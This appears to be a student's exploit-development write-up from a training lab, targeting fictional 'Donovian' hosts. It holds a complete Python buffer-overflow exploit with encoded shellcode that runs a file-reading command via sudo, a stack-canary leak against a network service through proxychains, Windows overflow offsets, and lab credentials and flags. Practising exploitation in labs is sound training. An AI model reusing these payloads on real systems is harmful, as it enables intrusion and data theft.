# Exploit Development Writeup

Movement:
```
>Jump
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump
->donovian_grey_host
-->T3: 192.168.150.245
```

## Targets

T1:
```
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.
```

T2:
```
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
```

T3:
```
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine
```

## ELF Exploitation 1

SIGSEV on long input.
Offset: 72

Start: `0xf7def000`
End:   `0xf7ffe000`

EIP Inject Address: `0xf7f8f9e7`

Shellcode:
```
set CMD "cat /.secret/.verysecret.pdf"

buf =  b""
buf += b"\xdb\xde\xd9\x74\x24\xf4\xba\x95\x77\xe3\x5b\x5e"
buf += b"\x2b\xc9\xb1\x11\x31\x56\x17\x83\xee\xfc\x03\xc3"
buf += b"\x64\x01\xae\x81\x81\x9d\xc8\x07\xf0\x75\xc6\xc4"
buf += b"\x75\x62\x70\x25\xf5\x05\x81\x51\xd6\xb7\xe8\xcf"
buf += b"\xa1\xdb\xb9\xe7\xaf\x1b\x3e\xf7\xac\x7a\x4a\xd7"
buf += b"\x1d\x53\xc1\x72\x01\xd9\x40\x08\xea\x33\xfd\x95"
buf += b"\x86\x32\x72\x30\x04\xb7\x11\xce\xe4\x47\xbe\x4c"
buf += b"\xf9\xf0\x6d\x19\x18\x33\x11"
```

Exploit:
```python
pad_len = 76
pad = "A"*pad_len

eip_inject = "\x51\x1b\xdf\xf7"

nop = "\x90"*10

buf =  b""
buf += b"\xdb\xde\xd9\x74\x24\xf4\xba\x95\x77\xe3\x5b\x5e"
buf += b"\x2b\xc9\xb1\x11\x31\x56\x17\x83\xee\xfc\x03\xc3"
buf += b"\x64\x01\xae\x81\x81\x9d\xc8\x07\xf0\x75\xc6\xc4"
buf += b"\x75\x62\x70\x25\xf5\x05\x81\x51\xd6\xb7\xe8\xcf"
buf += b"\xa1\xdb\xb9\xe7\xaf\x1b\x3e\xf7\xac\x7a\x4a\xd7"
buf += b"\x1d\x53\xc1\x72\x01\xd9\x40\x08\xea\x33\xfd\x95"
buf += b"\x86\x32\x72\x30\x04\xb7\x11\xce\xe4\x47\xbe\x4c"
buf += b"\xf9\xf0\x6d\x19\x18\x33\x11"

print(pad + eip_inject + nop + buf)
```

Execute:
```
python /tmp/tmp.OIOo0zgNZY/exp.py | sudo ./inventory.exe

Gag4V9t7qluE8sJM2ajI
```

## ELF Exploitation 2

Starts a server on port 1215
```
comrade@ftp:/.hidden$ ./inventory2.exe
^Z
[1]+  Stopped                 ./inventory2.exe
comrade@ftp:/.hidden$ ss -antlp

LISTEN0      3              0.0.0.0:1215        0.0.0.0:*     users:(("inventory2.exe",pid=31634,fd=3))
```

Connecting to the server and writing long output results
in stack smashing.

Leak Canary:
```
student@lin-ops:~/Desktop/Exploit_Dev$ python -c 'print("A"*72)' | proxychains nc 192.168.28.105 1215 > out.txt
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.105:1215-<><>-OK
student@lin-ops:~/Desktop/Exploit_Dev$ ls
elf_2.py  exp.py  exp_elf1.py  func  out.txt  peda-session-func.txt
student@lin-ops:~/Desktop/Exploit_Dev$ xxd out.txt
00000000: 5072 6f78 7943 6861 696e 732d 332e 3120  ProxyChains-3.1
00000010: 2868 7474 703a 2f2f 7072 6f78 7963 6861  (http://proxycha
00000020: 696e 732e 7366 2e6e 6574 290a 506c 6561  ins.sf.net).Plea
00000030: 7365 2065 6e74 6572 2079 6f75 7220 6d65  se enter your me
00000040: 7373 6167 652e 0a00 0001 4141 4141 4141  ssage.....AAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000090: 4141 0a47 2322 61cd 43f5                 AA.G#"a.C.
```

Canary:
```
35 c36b 9bc2 0d95
```

## Windows

Offset: 2002
JMP ESP: 0x625012A0

Nmap scan report for 192.168.150.245
Host is up (0.0022s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
9999/tcp open  abyss

bOoapJhKZKk554o0vF0H
